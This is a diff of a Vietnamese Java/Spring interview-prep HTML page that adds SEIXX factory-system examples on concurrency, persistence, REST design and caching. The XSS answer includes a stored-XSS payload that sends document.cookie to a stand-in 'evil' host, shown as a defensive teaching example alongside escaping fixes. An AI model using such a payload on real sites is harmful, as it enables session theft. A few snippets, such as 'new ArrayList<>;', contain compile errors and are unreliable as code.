               <p><strong>Chọn:</strong> ưu tiên interface cho abstraction linh hoạt; dùng abstract class khi thực sự cần state/constructor hoặc hành vi dùng chung. Có thể kết hợp: abstract class implements interface.</p>
+              <p><strong>Ở SEIXX:</strong> <code>CsvImporter</code> là abstract class — giữ sẵn logic đọc file, đếm dòng, gom lỗi chung; lớp con chỉ override phần đặc thù. <code>Auditable</code> là interface — nhiều loại entity khác nhau đều cần “ghi vết ai sửa”:</p>
+              <pre><code>public abstract class CsvImporter {
+  public ImportResult importFile(InputStream in) {  // template chung
+    List&lt;CsvRow&gt; rows = readAll(in);
+    List&lt;RowError&gt; errors = new ArrayList&lt;&gt;();
+    for (CsvRow row : rows) {
+      RowError err = validateRow(row.getColumns(), row.getLineNo());
+      if (err != null) errors.add(err);
+    }
+    return new ImportResult(rows.size(), errors);
+  }
+  protected abstract RowError validateRow(String[] cols, int lineNo);
+}
+
+public interface Auditable {
+  String getChangedBy();
+  LocalDateTime getChangedAt();
+}</code></pre>
             </div>
           </details>
 
@@ -1168,6 +1464,8 @@ BigDecimal total = price.multiply(BigDecimal.valueOf(3))
                 </table>
               </div>
               <p><strong>Bên trong HashMap:</strong> mảng bucket + linked list; từ Java 8, bucket dài ≥ 8 (và capacity ≥ 64) chuyển thành red-black tree để giảm O(n) xuống O(log n). Load factor mặc định 0.75.</p>
+              <p><strong>Ở SEIXX:</strong> cache trong RAM cho danh mục nhà máy (ít đổi):
+              <code>HashMap</code> nếu chỉ service khởi tạo lúc startup rồi chỉ đọc; nếu cache bị cập nhật runtime mà có nhiều request đọc thì dùng <code>ConcurrentHashMap</code> để không gặp lỗi vòng lặp vô hạn hoặc đọc dữ liệu rác. Không đặt cache trong field static của service mà quản lý vòng đời cẩn thận.</p>
             </div>
           </details>
 
@@ -1191,6 +1489,18 @@ List&lt;StudentDto&gt; dtos = students.stream()
             .average()
             .orElse(0)
     ))
+    .toList();</code></pre>
+              <p><strong>Ở SEIXX:</strong> màn hình danh sách thiết bị cần kèm tên nhà máy và tổng sản lượng tuần này — dùng DTO record + stream map, hoặc query projection để tránh N+1:</p>
+              <pre><code>public record EquipmentDto(Long id, String code, String factoryName,
+                           String status, long weeklyOutput) {
+  static EquipmentDto from(Equipment e, long output) {
+    return new EquipmentDto(e.getId(), e.getEquipmentCode(),
+        e.getFactory().getName(), e.getStatus(), output);
+  }
+}
+
+List&lt;EquipmentDto&gt; page = equipments.stream()
+    .map(e -&gt; EquipmentDto.from(e, outputCache.getOrDefault(e.getId(), 0L)))
     .toList();</code></pre>
               <ul>
                 <li>Với quan hệ LAZY, truy cập trong lúc map có thể gây <code>LazyInitializationException</code> hoặc N+1. Dùng fetch join, projection hoặc DTO query.</li>
@@ -1219,6 +1529,18 @@ List&lt;StudentDto&gt; dtos = students.stream()
     .map(Student::getName)
     .filter(s -&gt; !s.isBlank())
     .orElseThrow(() -&gt; new NotFoundException("Student not found"));</code></pre>
+              <p><strong>Ở SEIXX:</strong> handler đổi trạng thái thiết bị — tìm không thấy thì ném lỗi nghiệp vụ rõ ràng, không để NullPointerException rơi xuống tận cuối:</p>
+              <pre><code>Equipment eq = repo.findById(id)
+    .orElseThrow(() -&gt; new BusinessException(
+        "EQ_NOT_FOUND", "Không tìm thấy thiết bị id=" + id));
+
+String factoryName = Optional.ofNullable(eq.getFactory())
+    .map(Factory::getName)
+    .orElse("(chưa gán nhà máy)");
+
+// orElse vs orElseGet: orElseGet chỉ chạy khi thực sự empty
+String note = Optional.ofNullable(eq.getNote())
+    .orElseGet(() -&gt; loadDefaultNote());  // không gọi DB vô ích</code></pre>
               <p><strong>Ngoại lệ:</strong> dùng unchecked exception cho lỗi nghiệp vụ; bắt exception cụ thể; không nuốt lỗi; log kèm context; không lộ stack trace ra client.</p>
             </div>
           </details>
@@ -1244,6 +1566,125 @@ List&lt;Student&gt; result = students.stream()
                 <li><strong>Validate:</strong> dùng Bean Validation (<code>@NotNull</code>, <code>@Size</code>, <code>@Pattern</code>) cho input; Predicate phù hợp cho rule nội bộ.</li>
                 <li>Không lạm dụng Predicate cho logic quá phức tạp; tách hàm có tên rõ ràng để dễ test.</li>
               </ul>
+              <p><strong>Ở SEIXX:</strong> màn hình tìm kiếm thiết bị có 4 ô lọc tùy chọn (nhà máy, trạng thái, khoảng ngày, từ khóa) — ghép Predicate dần theo tham số nào được điền:</p>
+              <pre><code>Predicate&lt;Equipment&gt; spec = e -&gt; true;           // bắt đầu không lọc gì
+
+if (filter.factoryId() != null)
+  spec = spec.and(e -&gt; e.getFactoryId().equals(filter.factoryId()));
+if (filter.status() != null)
+  spec = spec.and(e -&gt; filter.status().equals(e.getStatus()));
+if (filter.from() != null)
+  spec = spec.and(e -&gt; !e.getUpdatedAt().isBefore(filter.from()));
+if (filter.keyword() != null)
+  spec = spec.and(e -&gt; e.getEquipmentCode().contains(filter.keyword()));
+
+List&lt;Equipment&gt; result = equipments.stream().filter(spec).toList();</code></pre>
+            </div>
+          </details>
+
+          <details class="qa" id="q-java-thread">
+            <summary>
+              <span class="q-index">18</span>
+              <span class="q-text">Thread là gì? Có mấy cách tạo thread và nên dùng cách nào?</span>
+              <span class="q-tag orange">Java</span>
+              <span class="chevron" aria-hidden="true"></span>
+            </summary>
+            <div class="answer">
+              <p><strong>Thread</strong> là đơn vị thực thi nhỏ nhất trong một process. Các thread chia sẻ chung heap + method area, mỗi thread có stack và program counter riêng — nhờ đó tận dụng CPU khi có tác vụ I/O (chờ file, chờ DB).</p>
+              <ul>
+                <li><strong>Cách 1 — extends Thread:</strong> đơn giản nhưng chiếm mất suất kế thừa, task gắn chặt với cơ chế chạy → ít dùng.</li>
+                <li><strong>Cách 2 — implements Runnable:</strong> tách task khỏi thread, linh hoạt hơn; nhưng vẫn phải tự tạo Thread.</li>
+                <li><strong>Cách 3 — ExecutorService (thread pool):</strong> cách dùng thực tế trong web app — tái sử dụng thread, giới hạn số lượng, có hàng đợi.</li>
+                <li><strong>Cách 4 — CompletableFuture:</strong> bất đồng bộ và compose nhiều bước (Java 8+).</li>
+              </ul>
+              <pre><code>// Cách 2: Runnable với lambda
+Thread t = new Thread(() -&gt; System.out.println("importing..."));
+t.start();
+
+// Cách 3: thread pool — khuyên dùng
+ExecutorService pool = Executors.newFixedThreadPool(4);
+Future&lt;ImportResult&gt; f = pool.submit(() -&gt; importCsv(file));
+
+// Cách 4: bất đồng bộ có compose
+CompletableFuture.supplyAsync(() -&gt; parseCsv(file), pool)
+    .thenApply(this::validate)
+    .thenAccept(this::saveBatch);</code></pre>
+              <p><strong>Ở SEIXX:</strong> import 10.000 dòng CSV — đọc và validate chia theo chunk chạy song song trên pool, ghi DB theo batch 500. Không <code>new Thread()</code> thủ công trong web app: mỗi request một thread sẽ nổ số thread khi tải cao, phải dùng pool có cấu hình core/max/queue.</p>
+            </div>
+          </details>
+
+          <details class="qa" id="q-java-thread-lifecycle">
+            <summary>
+              <span class="q-index">19</span>
+              <span class="q-text">Trình bày vòng đời của một thread trong Java (6 trạng thái)?</span>
+              <span class="q-tag orange">Java</span>
+              <span class="chevron" aria-hidden="true"></span>
+            </summary>
+            <div class="answer">
+              <p><code>Thread.getState()</code> trả về <code>Thread.State</code> với 6 trạng thái:</p>
+              <ol>
+                <li><strong>NEW:</strong> đã tạo <code>new Thread(...)</code> nhưng chưa gọi <code>start()</code>.</li>
+                <li><strong>RUNNABLE:</strong> đã <code>start()</code> — sẵn sàng chạy hoặc đang chạy, chờ CPU/OS scheduler.</li>
+                <li><strong>BLOCKED:</strong> chờ khóa monitor để vào vùng <code>synchronized</code>.</li>
+                <li><strong>WAITING:</strong> chờ vô thời hạn — <code>Object.wait()</code>, <code>thread.join()</code>, <code>LockSupport.park()</code>.</li>
+                <li><strong>TIMED_WAITING:</strong> chờ có thời hạn — <code>Thread.sleep(ms)</code>, <code>wait(ms)</code>, <code>join(ms)</code>.</li>
+                <li><strong>TERMINATED:</strong> <code>run()</code> đã kết thúc (bình thường hoặc do exception).</li>
+              </ol>
+              <pre><code>NEW --start()--&gt; RUNNABLE --(chờ monitor)--&gt; BLOCKED --(lấy được lock)--&gt; RUNNABLE
+RUNNABLE --sleep(ms)/wait(ms)--&gt; TIMED_WAITING --(hết thời gian/notify)--&gt; RUNNABLE
+RUNNABLE --wait()/join()--&gt; WAITING --(notify()/thread kết thúc)--&gt; RUNNABLE
+RUNNABLE --run() kết thúc--&gt; TERMINATED
+
+Thread t = new Thread(() -&gt; {
+  synchronized (lock) {        // có thể BLOCKED khi tranh lock
+    Thread.sleep(500);         // TIMED_WAITING
+  }
+});
+t.start();
+System.out.println(t.getState());  // RUNNABLE / TIMED_WAITING / ...</code></pre>
+              <ul>
+                <li><strong>Phân biệt:</strong> gọi <code>start()</code> mới sinh thread mới; gọi trực tiếp <code>run()</code> chỉ là gọi hàm bình thường trên thread hiện tại.</li>
+                <li><strong>Không dừng thread</strong> bằng <code>stop()</code> (deprecated, có thể để lại trạng thái dở dang) — dùng cờ <code>volatile boolean running</code> hoặc <code>interrupt()</code> + kiểm tra <code>isInterrupted()</code>.</li>
+                <li><strong>Hay hỏi tiếp:</strong> <code>sleep()</code> không nhả lock, còn <code>wait()</code> nhả lock — nên <code>wait()</code> phải gọi trong <code>synchronized</code>.</li>
+              </ul>
+              <p><strong>Ở SEIXX:</strong> import CSV chạy nền — log <code>getActiveCount()</code> và <code>getQueue().size()</code> của pool; thread đọc file hay ở TIMED_WAITING, thread ghi batch có thể BLOCKED khi tranh connection. Nhìn state giúp phát hiện deadlock/starvation thay vì đoán.</p>
+            </div>
+          </details>
+
+          <details class="qa" id="q-java-runnable-callable">
+            <summary>
+              <span class="q-index">20</span>
+              <span class="q-text">Phân biệt Runnable và Callable? Khi nào dùng cái nào?</span>
+              <span class="q-tag orange">Java</span>
+              <span class="chevron" aria-hidden="true"></span>
+            </summary>
+            <div class="answer">
+              <table>
+                <thead><tr><th></th><th>Runnable</th><th>Callable&lt;V&gt;</th></tr></thead>
+                <tbody>
+                  <tr><td>Method</td><td><code>run()</code></td><td><code>call()</code></td></tr>
+                  <tr><td>Giá trị trả về</td><td>void — không trả về</td><td>trả về <code>V</code></td></tr>
+                  <tr><td>Exception</td><td>không throws checked</td><td>throws <code>Exception</code></td></tr>
+                  <tr><td>Lấy kết quả</td><td>không lấy được</td><td>qua <code>Future.get()</code></td></tr>
+                  <tr><td>Dùng với</td><td><code>Thread</code>, <code>execute()</code></td><td><code>submit()</code> của ExecutorService</td></tr>
+                </tbody>
+              </table>
+              <pre><code>// Runnable: task không cần kết quả
+executor.execute(() -&gt; log.info("audit done"));
+
+// Callable: cần kết quả + được phép ném checked exception
+ExecutorService pool = Executors.newFixedThreadPool(4);
+Future&lt;ImportSummary&gt; future = pool.submit(() -&gt; {
+  return importCsv(file);   // call() throws Exception
+});
+
+ImportSummary summary = future.get(30, TimeUnit.SECONDS); // chờ + timeout</code></pre>
+              <ul>
+                <li><strong>Chọn:</strong> task chỉ để chạy (ghi log, gửi mail) → Runnable; cần lấy kết quả (đếm dòng import) → Callable.</li>
+                <li><strong>Future.get()</strong> là blocking — luôn dùng bản có <code>timeout</code> để không treo; hoặc <code>CompletableFuture</code> nếu muốn không block.</li>
+                <li>Lỗi từ <code>call()</code> bọc trong <code>ExecutionException</code> — unwrap <code>getCause()</code> để log đúng lỗi nghiệp vụ.</li>
+              </ul>
+              <p><strong>Ở SEIXX:</strong> import CSV dùng <code>Callable&lt;ImportSummary&gt;</code> cho từng chunk (trả số dòng thành công/lỗi rồi gộp); task ghi audit sau import chỉ cần <code>Runnable</code> vì không cần kết quả.</p>
             </div>
           </details>
         </div>
@@ -1257,7 +1698,7 @@ List&lt;Student&gt; result = students.stream()
             <p>Từ IoC, bean, REST, JPA đến transaction, Redis, microservices và xử lý lỗi production.</p>
           </div>
           <div class="section-actions">
-            <span class="qa-count">29 câu hỏi</span>
+            <span class="qa-count">30 câu hỏi</span>
             <button class="mini-btn" type="button" data-toggle-section="backend">Mở tất cả</button>
           </div>
         </div>
@@ -1285,6 +1726,7 @@ List&lt;Student&gt; result = students.stream()
                 </table>
               </div>
               <p><strong>Kết luận:</strong> JSF mạnh về component server-side nhưng nặng state và ít phù hợp REST; Spring MVC linh hoạt, dễ tích hợp SPA và phổ biến hơn trong các dự án backend hiện đại.</p>
+              <p><strong>Ở SEIXX:</strong> màn hình danh sách thiết bị là SPA (Vue) gọi REST API — Spring MVC chỉ trả JSON, stateless nên scale ngang dễ; với JSF thì component tree sống trên server mỗi session, mỗi thao tác round-trip toàn trang, rất khó tách FE/BE và tốn bộ nhớ khi đông người dùng.</p>
             </div>
           </details>
 
@@ -1304,6 +1746,23 @@ List&lt;Student&gt; result = students.stream()
                 <li>Đổi chỗ có thể chạy nhưng làm mất tính rõ ràng, ảnh hưởng AOP/transaction và khó bảo trì.</li>
               </ul>
               <p><strong>Trả lời ngắn:</strong> “Có thể về mặt kỹ thuật vì cùng là <code>@Component</code>, nhưng không nên vì sai semantic và làm hỏng kiến trúc tầng.”</p>
+              <pre><code>@RestController            // tầng web: nhận/trả HTTP
+@RequestMapping("/api/equipments")
+class EquipmentController {
+  private final EquipmentService service;
+  @GetMapping
+  Page&lt;EquipmentDto&gt; search(@Valid EquipmentFilter filter) {
+    return service.search(filter);   // không nhét nghiệp vụ ở đây
+  }
+}
+
+@Service                    // tầng nghiệp vụ: rule + transaction
+class EquipmentService {
+  @Transactional(readOnly = true)
+  Page&lt;EquipmentDto&gt; search(EquipmentFilter filter) {
+    return repo.search(filter).map(EquipmentDto::from);
+  }
+}</code></pre>
             </div>
           </details>
 
@@ -1329,6 +1788,12 @@ public class AppConfig {
   public RestTemplate restTemplate() {
     return new RestTemplate();
   }
+}</code></pre>
+              <p><strong>Ở SEIXX:</strong> các class của mình (<code>EquipmentService</code>, <code>CsvParser</code>) dùng <code>@Service</code>/<code>@Component</code> + component scan; chỉ những thứ cần cấu hình thủ công mới viết <code>@Bean</code> — ví dụ <code>ObjectMapper</code> cấu hình riêng cho đọc file Shift-JIS, hoặc <code>Clock</code> để test thời gian giả lập:</p>
+              <pre><code>@Bean
+public ObjectMapper csvObjectMapper() {
+  return new ObjectMapper()
+      .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
 }</code></pre>
             </div>
           </details>
@@ -1402,6 +1867,22 @@ public class OrderService {
                 <li><strong>Web scopes:</strong> request (mỗi HTTP request), session (mỗi session), application (mỗi ServletContext), websocket.</li>
               </ul>
               <p><strong>Lưu ý:</strong> inject prototype vào singleton chỉ tạo mới một lần lúc khởi tạo; muốn luôn nhận instance mới thì dùng ObjectProvider, @Lookup hoặc scoped proxy. Chọn sai scope — singleton giữ state của từng request — là lỗi kinh điển gây lẫn dữ liệu giữa người dùng.</p>
+              <pre><code>// BUG kinh điển: singleton giữ state của từng request
+@Service
+class ImportService {
+  private List&lt;String&gt; currentErrors = new ArrayList&lt;&gt;; // ← STATE CHUNG!
+
+  public ImportResult importCsv(MultipartFile file) {
+    currentErrors.clear();   // 2 người import cùng lúc → ghi đè lẫn nhau
+    ...
+  }
+}
+
+// ĐÚNG: service stateless, dữ liệu để trong biến local
+public ImportResult importCsv(MultipartFile file) {
+  List&lt;String&gt; errors = new ArrayList&lt;&gt;;  // mỗi request một list riêng
+  ...
+}</code></pre>
             </div>
           </details>
 
@@ -1483,6 +1964,22 @@ public class GlobalExceptionHandler {
                 <li>Thêm <code>@Repository</code> vào interface repository thường không sai nhưng dư thừa và không cần thiết.</li>
                 <li>Cần <code>@EnableJpaRepositories</code> (Spring Boot auto-config thường đã bật) và entity manager/data source đúng cấu hình.</li>
               </ul>
+              <pre><code>// Spring Data JPA: interface là đủ, Spring tự tạo proxy
+public interface EquipmentRepository extends JpaRepository&lt;Equipment, Long&gt; {
+  List&lt;Equipment&gt; findByFactoryId(Long factoryId);
+}
+
+// MyBatis (SEIXX): cũng không cần @Repository, mapper interface + XML
+public interface EquipmentMapper {
+  List&lt;Equipment&gt; findByFactoryId(@Param("factoryId") Long factoryId);
+}
+
+// @Repository chỉ thật sự cần khi tự viết DAO class
+@Repository
+public class EquipmentDao {
+  private final JdbcTemplate jdbc;   // exception được chuyển thành DataAccessException
+  ...
+}</code></pre>
             </div>
           </details>
 
@@ -1539,6 +2036,16 @@ public List&lt;StudentDto&gt; updateBatch(List&lt;StudentUpdateDto&gt; items) {
               </ul>
               <h4>Vòng đời cơ bản</h4>
               <p>Khởi tạo → inject dependency → BeanPostProcessor before → <code>@PostConstruct</code>/<code>afterPropertiesSet</code> → BeanPostProcessor after → sử dụng → <code>@PreDestroy</code>/<code>destroy</code>.</p>
+              <h4>Cấu trúc package thật của SEIXX</h4>
+              <pre><code>com.seixx.factory
+ ├─ controller/       EquipmentController, ImportController
+ ├─ service/          EquipmentService, CsvImportService (@Transactional)
+ ├─ repository/       EquipmentRepository, EquipmentMapper (MyBatis)
+ ├─ domain/           Equipment, Factory, ProductionLog (Entity)
+ ├─ dto/              EquipmentDto, ImportResult (request/response)
+ ├─ config/           SecurityConfig, MybatisConfig, AppConfig (@Bean)
+ ├─ exception/        GlobalExceptionHandler (@RestControllerAdvice)
+ └─ security/         JwtAuthenticationFilter, TokenProvider</code></pre>
             </div>
           </details>
 
@@ -1560,6 +2067,16 @@ public List&lt;StudentDto&gt; updateBatch(List&lt;StudentUpdateDto&gt; items) {
                 <li><strong>Java:</strong> OWASP Java Encoder, <code>HtmlUtils.htmlEscape</code>; không nối chuỗi HTML thủ công.</li>
                 <li>Không render lỗi/stack trace ra HTML; cập nhật dependency và framework.</li>
               </ul>
+              <p><strong>Ví dụ stored XSS ở SEIXX:</strong> ghi chú thiết bị cho phép nhập tự do; nếu FE hiển thị bằng <code>v-html</code> thì đoạn <code>&lt;img src=x onerror="fetch('//evil?c='+document.cookie)"&gt;</code> do user nhập sẽ chạy trên máy người khác khi mở danh sách. Cách chặn đúng:</p>
+              <pre><code>&lt;!-- SAI: render thô HTML người dùng nhập --&gt;
+&lt;div v-html="equipment.note"&gt;&lt;/div&gt;
+
+&lt;!-- ĐÚNG: interpolation tự escape --&gt;
+&lt;div&gt;{{ equipment.note }}&lt;/div&gt;
+
+&lt;!-- Bắt buộc giữ HTML (rich text) thì sanitize trước --&gt;
+&lt;div v-html="DOMPurify.sanitize(equipment.note)"&gt;&lt;/div&gt;</code></pre>
+              <p>Đồng thời backend validate whitelist khi lưu, và access token để trong memory (không localStorage) để cookie/token không bị đọc trộm.</p>
             </div>
           </details>
 
@@ -1644,6 +2161,27 @@ public List&lt;StudentDto&gt; updateBatch(List&lt;StudentUpdateDto&gt; items) {
   }
 }</code></pre>
               <div class="callout warn">Luôn dùng tham số bind (<code>?</code>) thay vì nối chuỗi SQL từ input người dùng.</div>
+              <p><strong>Ở SEIXX:</strong> service import CSV dùng batch để ghi 10.000 dòng nhanh — gom theo lô 500, một PreparedStatement tái sử dụng, tắt auto-commit:</p>
+              <pre><code>// JDBC thuần: batch insert nhanh hơn insert từng dòng ~10-50 lần
+c.setAutoCommit(false);
+try (PreparedStatement ps = c.prepareStatement(
+    "INSERT INTO equipment(factory_id, equipment_code, status) VALUES (?,?,?)")) {
+  int i = 0;
+  for (CsvRow row : rows) {
+    ps.setLong(1, row.factoryId());
+    ps.setString(2, row.code());
+    ps.setString(3, row.status());
+    ps.addBatch();
+    if (++i % 500 == 0) ps.executeBatch();  // xả lô mỗi 500 dòng
+  }
+  ps.executeBatch();
+  c.commit();
+} catch (SQLException e) {
+  c.rollback();
+  throw new CsvImportException("Ghi dữ liệu import thất bại", e);
+} finally {
+  c.setAutoCommit(true);
+}</code></pre>
             </div>
           </details>
 
@@ -1672,6 +2210,16 @@ public interface StudentDao {
   Optional&lt;Student&gt; selectById(Long id);
 }</code></pre>
               <p><strong>So với MyBatis:</strong> Doma kiểm tra SQL/annotation sớm hơn ở compile-time và có two-way SQL; MyBatis linh hoạt dynamic SQL và phổ biến hơn.</p>
+              <p><strong>Two-way SQL của Doma:</strong> câu SQL trong file <code>.sql</code> đúng cú pháp SQL thật — dán vào DB client chạy được ngay, nhưng khi chạy qua Doma thì comment <code>/*%if ... */</code> được xử lý thành điều kiện động:</p>
+              <pre><code>/* src/main/resources/META-INF/.../EquipmentDao/search.sql */
+SELECT id, equipment_code, status
+FROM equipment
+WHERE factory_id = /* factoryId */1
+/*%if status != null */
+  AND status = /* status */'RUNNING'
+/*%end*/
+ORDER BY updated_at DESC</code></pre>
+              <p>Khớp với method: <code>List&lt;Equipment&gt; search(@Param("factoryId") Long factoryId, @Param("status") String status);</code></p>
             </div>
           </details>
 
@@ -1698,6 +2246,20 @@ public interface StudentDao {
                 </table>
               </div>
               <p><strong>Trong dự án SEIXX:</strong> dùng MyBatis với XML Mapper, viết SQL trực tiếp và map về model — phù hợp với đặc thù nghiệp vụ và yêu cầu kiểm soát truy vấn.</p>
+              <pre><code>&lt;!-- EquipmentMapper.xml — dynamic SQL mạnh của MyBatis --&gt;
+&lt;select id="search" resultType="Equipment"&gt;
+  SELECT * FROM equipment
+  WHERE factory_id = #{factoryId}
+  &lt;if test="status != null"&gt;
+    AND status = #{status}
+  &lt;/if&gt;
+  &lt;if test="from != null"&gt;
+    AND updated_at &gt;= #{from}
+  &lt;/if&gt;
+  ORDER BY updated_at DESC
+  LIMIT #{size} OFFSET #{offset}
+&lt;/select&gt;</code></pre>
+              <p>Với JPA tương tự sẽ là Criteria/Specification rườm rà hơn — đây là lý do các màn hình search nhiều điều kiện của SEIXX chọn MyBatis; ngược lại CRUD đơn giản thì Spring Data JPA gọn hơn.</p>
             </div>
           </details>
 
@@ -1723,6 +2285,13 @@ GET    /api/v1/students/{id}
 PUT    /api/v1/students/{id}
 PATCH  /api/v1/students/{id}
 DELETE /api/v1/students/{id}</code></pre>
+              <p><strong>Ở SEIXX:</strong> API thiết bị đặt tên theo tài nguyên số nhiều, method đúng ngữ nghĩa:</p>
+              <pre><code>GET    /api/v1/equipments?factoryId=12&amp;status=RUNNING   → 200 + page
+POST   /api/v1/equipments            → 201 + Location header
+PATCH  /api/v1/equipments/{id}       → 204 (đổi status, partial)
+DELETE /api/v1/equipments/{id}       → 409 nếu còn production_log (FK RESTRICT)
+POST   /api/v1/equipments/import     → 202 + jobId (import CSV bất đồng bộ)
+GET    /api/v1/import-jobs/{jobId}   → trạng thái + số dòng lỗi</code></pre>
             </div>
           </details>
 
@@ -1750,6 +2319,26 @@ DELETE /api/v1/students/{id}</code></pre>
                 <li><strong>Hot key:</strong> local cache, sharding key, replica.</li>
                 <li><strong>Nhất quán:</strong> TTL hợp lý, invalidate sau commit, chấp nhận eventual consistency; không cache dữ liệu nhạy cảm chưa mã hóa.</li>
               </ul>
+              <pre><code>// SEIXX: cache danh mục nhà máy (500 dòng, ít đổi)
+public FactoryDto getFactory(Long id) {
+  String key = "factory:" + id;
+  String cached = redis.get(key);
+  if (cached != null) return json.from(cached, FactoryDto.class); // hit
+
+  FactoryDto dto = repo.findById(id).map(FactoryDto::from)
+      .orElseThrow(() -&gt; new BusinessException("FACTORY_NOT_FOUND"));
+
+  redis.setex(key, Duration.ofMinutes(10), json.to(dto)); // miss → nạp lại
+  return dto;
+}
+
+// Khi update: xóa cache SAU khi commit thành công
+@Transactional
+public void updateFactory(Long id, FactoryUpdateDto dto) {
+  ... // lưu DB
+  transactionSynchronization.afterCommit(() -&gt; redis.del("factory:" + id));
+}</code></pre>
+              <p><strong>Khi Redis lỗi:</strong> bọc mọi lệnh cache trong try/catch fallback DB (Redis chỉ là tăng tốc, không phải nguồn dữ liệu thật); refresh token đã revoke vẫn có DB làm chốt.</p>
             </div>
           </details>
 
@@ -1771,6 +2360,18 @@ DELETE /api/v1/students/{id}</code></pre>
                 <li><strong>Đo lại</strong> sau mỗi thay đổi; không tối ưu mù quáng.</li>
               </ol>
               <div class="callout tip"><strong>Trả lời ngắn:</strong> “Em ưu tiên đo bằng execution plan và slow query log, sau đó xử lý index/query/lock trước khi thêm cache hoặc scale DB.”</div>
+              <p><strong>Ví dụ SEIXX:</strong> dashboard đột nhiên chậm hơn trước sau khi bảng log lên 2 triệu dòng — kiểm tra theo thứ tự:</p>
+              <pre><code>-- 1. Đo: bật slow query log (>1s) — chỉ đúng 1 query xuất hiện
+SELECT factory_id, COUNT(*) FROM production_log
+WHERE logged_at &gt;= now() - interval '7 days'   -- 3.2s
+GROUP BY factory_id;
+
+-- 2. Execution plan: Seq Scan 2M dòng
+EXPLAIN ANALYZE ...;
+
+-- 3. Sửa: index đúng cột lọc theo thời gian
+CREATE INDEX idx_pl_logged_factory ON production_log (logged_at, factory_id);
+-- 4. Đo lại: 3.2s → 120ms  ✓</code></pre>
             </div>
           </details>
 
@@ -1790,6 +2391,7 @@ DELETE /api/v1/students/{id}</code></pre>
                 <li><strong>Sau sự cố:</strong> viết postmortem, thêm test/regression, cải thiện CI/CD, alerting và checklist deploy.</li>
               </ol>
               <p>Điểm quan trọng khi phỏng vấn: không đổ lỗi, có quy trình rollback, monitoring và học từ sự cố.</p>
+              <p><strong>Ví dụ SEIXX:</strong> test pass nhưng lên production màn hình import báo lỗi 500. Log production chỉ có <code>FileNotFoundException: /data/csv/import/</code> — hóa ra đường dẫn này tồn tại ở máy dev nhưng chưa tạo trên server; cấu hình lấy từ biến môi trường khác nhau. Fix: thêm biến môi trường + health check kiểm tra thư mục lúc khởi động (fail-fast) + thêm case test dùng đường dẫn tạm thay vì hard-code máy dev.</p>
             </div>
           </details>
 
@@ -1815,6 +2417,7 @@ DELETE /api/v1/students/{id}</code></pre>
                 </table>
               </div>
               <p><strong>Khuyến nghị:</strong> bắt đầu monolith/modular monolith nếu domain chưa rõ; chỉ tách microservices khi có nhu cầu scale, team autonomy hoặc ranh giới domain rõ ràng. Microservices không tự động “tốt hơn”.</p>
+              <p><strong>Ví dụ SEIXX:</strong> hiện là monolith Spring Boot — 1 artifact, deploy 1 lần, join bảng thoải mái. Nếu tách: <em>equipment-service</em> và <em>production-service</em> riêng DB thì mất khả năng JOIN trực tiếp — báo cáo “sản lượng theo thiết bị” phải gọi API tổng hợp hoặc nghe event đồng bộ, kéo theo eventual consistency, retry, đối soát. Với quy mô hiện tại (1 khách hàng, dữ liệu vài triệu dòng) tách là tự tạo độ phức tạp không cần thiết; chỉ nên tách khi đã có module biên rõ ràng cần scale riêng.</p>
             </div>
           </details>
 
@@ -1840,6 +2443,7 @@ DELETE /api/v1/students/{id}</code></pre>
                 </table>
               </div>
               <p>Nếu “event push” là đẩy sự kiện xuống client, có thể dùng WebSocket/SSE; nếu là giao tiếp giữa service, dùng message broker. Chọn sync khi cần kết quả ngay, async khi cần decoupling và chịu tải.</p>
+              <p><strong>Ví dụ thực tế:</strong> import CSV 50.000 dòng của SEIXX — request POST trả <code>202 + jobId</code> ngay (không bắt user chờ 2 phút), khi xử lý xong worker publish event <code>import.completed</code> qua broker/WebSocket để FE hiện thông báo. Nếu dùng gRPC đồng bộ cho tác vụ này thì connection treo suốt thời gian xử lý — sai bài toán.</p>
             </div>
           </details>
 
@@ -1866,6 +2470,7 @@ public class StudentService {
     this.repo = repo;
   }
 }</code></pre>
+              <p><strong>Ở SEIXX:</strong> <code>EquipmentController</code> không tự <code>new EquipmentService()</code> — Spring tạo service (kèm repository bên trong), inject vào controller lúc khởi động. Nhờ vậy unit test chỉ cần <code>new EquipmentController(mockService)</code>; nếu thiếu bean, ứng dụng fail ngay lúc start chứ không chết lúc chạy.</p>
             </div>
           </details>
 
@@ -1910,6 +2515,17 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li><strong>@Controller/@RestController:</strong> tầng web.</li>
               </ul>
               <p>Tất cả đều là <code>@Component</code> ở metadata; khác nhau ở semantic và một số hành vi được Spring áp dụng thêm.</p>
+              <pre><code>@Service                                    // nghiệp vụ
+class EquipmentService { ... }
+
+@Repository                                 // persistence + chuyển exception
+class EquipmentDao { ... }
+
+@Component                                  // helper chung, không thuộc tầng nào
+class CsvParser { ... }
+
+@RestController                             // tầng web, trả JSON
+class EquipmentController { ... }</code></pre>
             </div>
           </details>
 
@@ -1928,6 +2544,15 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li><strong>Entity lifecycle:</strong> transient → managed (persist) → detached → removed; thay đổi trên managed entity được dirty checking và flush khi transaction commit.</li>
                 <li><strong>Cẩn thận:</strong> lazy loading ngoài transaction, N+1, cascade, orphanRemoval, flush mode.</li>
               </ul>
+              <p><strong>Ví dụ N+1 với Hibernate:</strong> duyệt 100 thiết bị và in tên nhà máy — nếu quan hệ LAZY, Hibernate bắn 1 query lấy 100 thiết bị + 100 query lấy nhà máy = 101 query; sửa bằng fetch join:</p>
+              <pre><code>// N+1: 101 query
+for (Equipment e : repo.findAll()) {
+  System.out.println(e.getFactory().getName()); // mỗi dòng 1 query
+}
+
+// Sửa: 1 query duy nhất
+@Query("SELECT e FROM Equipment e JOIN FETCH e.factory WHERE e.status = :status")
+List&lt;Equipment&gt; findByStatusWithFactory(@Param("status") String status);</code></pre>
             </div>
           </details>
 
@@ -1946,6 +2571,22 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li><strong>Ứng dụng:</strong> @Transactional, @Cacheable, @PreAuthorize, custom annotation logging.</li>
               </ul>
               <div class="callout warn"><strong>Nhớ kỹ:</strong> @Transactional hoạt động qua proxy — self-invocation (gọi trong cùng class) hoặc method non-public sẽ không được áp dụng. Rollback mặc định chỉ với RuntimeException/Error; checked exception cần rollbackFor.</div>
+              <p><strong>Ví dụ aspect tự viết:</strong> đo thời gian và log mọi method của service:</p>
+              <pre><code>@Aspect
+@Component
+public class LoggingAspect {
+
+  @Around("execution(* com.seixx.factory.service..*(..))")
